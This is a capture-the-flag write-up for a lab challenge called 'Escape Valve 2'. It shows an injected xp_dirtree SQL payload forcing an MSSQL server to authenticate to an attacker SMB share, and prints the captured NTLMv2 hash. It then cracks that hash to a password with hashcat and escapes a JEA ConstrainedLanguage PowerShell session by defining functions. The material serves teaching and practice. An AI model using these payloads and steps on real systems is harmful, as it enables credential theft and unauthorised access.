# Escape Valve 2

## Description

* Target IP: 3.142.209.118

## Solution

We didn't find a way to escalate privileges in the MSSQL database. We can perhaps try use `xp_dirtree` to force the system user to access remote share which then helps in stealing NTLMv2 hashes. 

> Note: This require public ec2 droplet. 

Let's install impacket tool to stand up a smbserver. 

```bash
pip3 install impacket
smbserver.py -smb2support test .
```

Now we can trigger share access using below payload.

```bash
python3 client.py "-1 exec xp_dirtree '\\<dropletip>\test'"
info: "Failed to find case details"
```

On the listener we get this. 

```bash
root@ip-172-31-21-120:~# smbserver.py -smb2support test .
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (18.118.104.60,51594)
[*] AUTHENTICATE_MESSAGE (HEIST\julia,HEIST)
[*] User HEIST\julia authenticated successfully
[*] julia::HEIST:aaaaaaaaaaaaaaaa:035473c1a5595addc4427f023c0c0e2c:010100000000000000e68c772061d8010b89447592523d29000000000100100075004c004b004600530072006c004e000300100075004c004b004600530072006c004e00020010004d005000680068006c00690055007200040010004d005000680068006c006900550072000700080000e68c772061d801060004000200000008003000300000000000000000000000003000002e9b9ec7f9f5c1e5a42880c1eec77946c010574e10f9a7e93e4ba89d47e606830a001000000000000000000000000000000000000900220063006900660073002f0033002e003100330035002e003200340038002e00360039000000000000000000
```

Save the hash to file. We can try to crack the hash using different rules. 

```bash
hashcat -m 5600 hash -r /usr/share/hashcat/rules/d3ad0ne.rule /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...
...
JULIA::HEIST:aaaaaaaaaaaaaaaa:035473c1a5595addc4427f023c0c0e2c:010100000000000000e68c772061d8010b89447592523d29000000000100100075004c004b004600530072006c004e000300100075004c004b004600530072006c004e00020010004d005000680068006c00690055007200040010004d005000680068006c006900550072000700080000e68c772061d801060004000200000008003000300000000000000000000000003000002e9b9ec7f9f5c1e5a42880c1eec77946c010574e10f9a7e93e4ba89d47e606830a001000000000000000000000000000000000000900220063006900660073002f0033002e003100330035002e003200340038002e00360039000000000000000000:kittycat5%
...
```

This gets cracked almost instant and the password is `kittycat5%`. We can try to login to WinRM service.

```bash
gem install evil-winrm
evil-winrm -i 18.118.104.60 -u julia -p 'kittycat5%'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMWSManFault happened, message is [WSMAN ERROR CODE: 5]: <f:WSManFault Code='5' Machine='18.118.104.60' xmlns:f='http://schemas.microsoft.com/wbem/wsman/1/wsmanfault'><f:Message>Access is denied. </f:Message></f:WSManFault>

Error: Exiting with code 1
```

User is not authorized to access WinRM. Let's confirm if this is same with Windows PSSession as well.
> Note: We've to update our trustedhosts list so that our winrm client starts interacting with the remote service.
```powershell
Enable-PSRemoting -Force
Set-Item wsman:localhost\client\trustedhosts -Value *
```
```powershell
PS C:\> enter-pssession -Credential julia -ComputerName 18.118.104.60
enter-pssession : Connecting to remote server 18.118.104.60 failed with the following error message : Access is
denied. For more information, see the about_Remote_Troubleshooting Help topic.
At line:1 char:1
+ enter-pssession -Credential $cred -ComputerName 18.118.104.60
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidArgument: (18.118.104.60:String) [Enter-PSSession], PSRemotingTransportException
    + FullyQualifiedErrorId : CreateRemoteRunspaceFailed
```

Same. It could be that the user remote access is restricted with Just Enough Administration (JEA). Let's retry this with `-ConfigurationName` as `juliaJEA`. 

```powershell
PS C:\Users\a852623> Enter-PSSession -ComputerName 18.118.104.60 -Credential julia  -ConfigurationName juliaJEA
[18.118.104.60]: PS>ls
The term 'ls' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the
spelling of the name, or if a path was included, verify that the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (ls:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException

[18.118.104.60]: PS>whoami
The term 'whoami.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the
spelling of the name, or if a path was included, verify that the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (whoami.exe:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

We land in a restricted shell. Let's enumerate the environment info.

```powershell
[18.118.104.60]: P> $env:username
julia
[18.118.104.60]: PS>$ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

We're in a ConstrainedLanguage mode. As per [docs](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) most of the features are blocked in this language mode. One known bypass is to downgrade the powershell version which drops to FullLanguage mode.

```powershell
[18.118.104.60]: PS>powershell -version 2
The term 'powershell.exe' is not recognized as the name of a cmdlet, function, script file, or operable program. Check
the spelling of the name, or if a path was included, verify that the path is correct and try again.
    + CategoryInfo          : ObjectNotFound: (powershell.exe:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

One other technique could be to see if user can define functions and then call them. 

```powershell
[18.118.104.60]: P> function test { whoami }
[18.118.104.60]: PS>test
heist\julia
```

This works. We find a flag on julia desktop.

```powershell
[18.118.104.60]: PS>function test { ls c:\users\julia\Desktop };test


    Directory: C:\users\julia\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/21/2016   3:36 PM            527 EC2 Feedback.website
-a----        6/21/2016   3:36 PM            554 EC2 Microsoft Windows Guide.website
-a----        4/30/2022   1:32 PM             33 flag.txt
```

Flag can be viewed similar way.

```powershell
[18.118.104.60]: PS>function test { cat c:\users\julia\Desktop\flag.txt };test
ACTCTF{n0t_en0ugh_4dm1n1str4t10n}
```

